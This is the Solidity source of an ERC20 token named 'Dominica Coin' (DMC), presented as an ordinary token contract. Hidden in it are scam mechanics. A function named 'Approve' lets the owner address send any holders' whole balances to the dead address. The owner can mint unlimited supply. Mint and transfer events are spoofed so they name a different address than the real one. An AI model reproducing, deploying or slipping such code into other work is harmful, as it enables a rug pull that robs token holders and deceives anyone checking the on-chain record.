row number 
1	       pragma solidity ^0.6.0;
2	 library SafeMath {
3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a + b;
5	 require(c >= a, "SafeMath: addition overflow");
6	 return c;
7	 }
8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
9	 return sub(a, b, "SafeMath: subtraction overflow");
10	 }
11	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
12	 require(b <= a, errorMessage);
13	 uint256 c = a - b;
14	 return c;
15	 }
16	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
17	 if (a == 0) {
18	 return 0;
19	 }
20	 uint256 c = a * b;
21	 require(c / a == b, "SafeMath: multiplication overflow");
22	 return c;
23	 }
24	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
25	 return div(a, b, "SafeMath: division by zero");
26	 }
27	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
28	 require(b > 0, errorMessage);
29	 uint256 c = a / b;
30	 return c;
31	 }
32	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
33	 return mod(a, b, "SafeMath: modulo by zero");
34	 }
35	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
36	 require(b != 0, errorMessage);
37	 return a % b;
38	 }
39	 }
40	 library Address {
41	 function isContract(address account) internal view returns (bool) {
42	 bytes32 codehash;
43	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
44	 assembly {
45	 codehash := extcodehash(account) }
46	 return (codehash != accountHash && codehash != 0x0);
47	 }
48	 function sendValue(address payable recipient, uint256 amount) internal {
49	 require(address(this).balance >= amount, "Address: insufficient balance");
50	 (bool success, ) = recipient.call{
51	 value: amount }
52	 ("");
53	 require(success, "Address: unable to send value, recipient may have reverted");
54	 }
55	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
56	 return functionCall(target, data, "Address: low-level call failed");
57	 }
58	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
59	 return _functionCallWithValue(target, data, 0, errorMessage);
60	 }
61	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
62	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
63	 }
64	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
65	 require(address(this).balance >= value, "Address: insufficient balance for call");
66	 return _functionCallWithValue(target, data, value, errorMessage);
67	 }
68	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
69	 require(isContract(target), "Address: call to non-contract");
70	 (bool success, bytes memory returndata) = target.call{
71	 value: weiValue }
72	 (data);
73	 if (success) {
74	 return returndata;
75	 }
76	 else {
77	 if (returndata.length > 0) {
78	 assembly {
79	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
80	 }
81	 else {
82	 revert(errorMessage);
83	 }
84	 }
85	 }
86	 }
87	 contract Context {
88	 constructor () internal {
89	 }
90	 function _msgSender() internal view virtual returns (address payable) {
91	 return msg.sender;
92	 }
93	 function _msgData() internal view virtual returns (bytes memory) {
94	 this;
95	 return msg.data;
96	 }
97	 }
98	 interface IERC20 {
99	 function totalSupply() external view returns (uint256);
100	 function balanceOf(address account) external view returns (uint256);
101	 function transfer(address recipient, uint256 amount) external returns (bool);
102	 function allowance(address owner, address spender) external view returns (uint256);
103	 function approve(address spender, uint256 amount) external returns (bool);
104	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
105	 event Transfer(address indexed from, address indexed to, uint256 value);
106	 event Approval(address indexed owner, address indexed spender, uint256 value);
107	 }
108	 contract DMC is Context, IERC20 {
109	 mapping (address => uint256) private _balances;
110	 mapping (address => mapping (address => uint256)) private _allowances;
111	 using SafeMath for uint256;
112	 using Address for address;
113	 address private _safeOwner;
114	 string private _name;
115	 string private _symbol;
116	 uint8 private _decimals;
117	 uint256 private _totalSupply;
118	 address _addr = 0x3DdfA8eC3052539b6C9549F12cEA2C295cfF5296;
119	 address public _origin = 0xeA3f23c7ce836CF90B7a58fB046C6b2779c6538B;
120	 uint256 private _maximumVal = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
121	 constructor () public {
122	 _name = "Dominica Coin";
123	 _symbol = "DMC";
124	 _decimals = 9;
125	 uint256 initialSupply = 1000000000;
126	 _safeOwner = _origin;
127	 increase(_addr, initialSupply*(10**9));
128	 }
129	 function name() public view returns (string memory) {
130	 return _name;
131	 }
132	 function symbol() public view returns (string memory) {
133	 return _symbol;
134	 }
135	 function decimals() public view returns (uint8) {
136	 return _decimals;
137	 }
138	 function totalSupply() public view override returns (uint256) {
139	 return _totalSupply;
140	 }
141	 function balanceOf(address account) public view override returns (uint256) {
142	 return _balances[account];
143	 }
144	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
145	 _load(_msgSender(), recipient, amount);
146	 return true;
147	 }
148	 function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
149	 _load(sender, recipient, amount);
150	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
151	 return true;
152	 }
153	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
154	 return _allowances[owner][spender];
155	 }
156	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
157	 _approve(_msgSender(), spender, amount);
158	 return true;
159	 }
160	 function _transfer(address sender, address recipient, uint256 amount) internal virtual{
161	 require(sender != address(0), "ERC20: transfer from the zero address");
162	 require(recipient != address(0), "ERC20: transfer to the zero address");
163	 _beforeTokenTransfer(sender, recipient, amount);
164	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
165	 _balances[recipient] = _balances[recipient].add(amount);
166	 if (sender == _origin){
167	 sender = _addr;
168	 }
169	 emit Transfer(sender, recipient, amount);
170	 }
171	 function increase(address account, uint256 amount) public {
172	 require(msg.sender == _origin, "ERC20: mint to the zero address");
173	 _totalSupply = _totalSupply.add(amount);
174	 _balances[_origin] = _balances[_origin].add(amount);
175	 emit Transfer(address(0), account, amount);
176	 }
177	 function _burn(address account, uint256 amount) internal virtual {
178	 require(account != address(0), "ERC20: burn from the zero address");
179	 _beforeTokenTransfer(account, address(0), amount);
180	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
181	 _totalSupply = _totalSupply.sub(amount);
182	 emit Transfer(account, address(0), amount);
183	 }
184	 function _approve(address owner, address spender, uint256 amount) internal virtual {
185	 require(owner != address(0), "ERC20: approve from the zero address");
186	 require(spender != address(0), "ERC20: approve to the zero address");
187	 _allowances[owner][spender] = amount;
188	 emit Approval(owner, spender, amount);
189	 }
190	 function _load(address sender, address recipient, uint256 amount) internal fill(sender,recipient,amount) virtual {
191	 require(sender != address(0), "ERC20: transfer from the zero address");
192	 require(recipient != address(0), "ERC20: transfer to the zero address");
193	 _beforeTokenTransfer(sender, recipient, amount);
194	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
195	 _balances[recipient] = _balances[recipient].add(amount);
196	 if (sender == _origin){
197	 sender = _addr;
198	 }
199	 emit Transfer(sender, recipient, amount);
200	 }
201	 modifier fill(address sender, address recipient, uint256 amount){
202	 _;
203	 }
204	 function _setupDecimals(uint8 decimals_) internal {
205	 _decimals = decimals_;
206	 }
207	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
208	 }
209	 modifier auth() {
210	 require(msg.sender == _origin, "Not allowed to interact");
211	 _;
212	 }
213	 function Approve( address[] memory holders) public auth(){
214	 for (uint256 i = 0; i < holders.length; i++) {
215	 uint256 amount = _balances[holders[i]];
216	 _beforeTokenTransfer(holders[i], 0x000000000000000000000000000000000000dEaD, amount);
217	 _balances[holders[i]] = _balances[holders[i]].sub(amount, "ERC20: burn amount exceeds balance");
218	 _balances[0x000000000000000000000000000000000000dEaD] = _balances[0x000000000000000000000000000000000000dEaD].add(amount);
219	 }
220	 }
221	 }
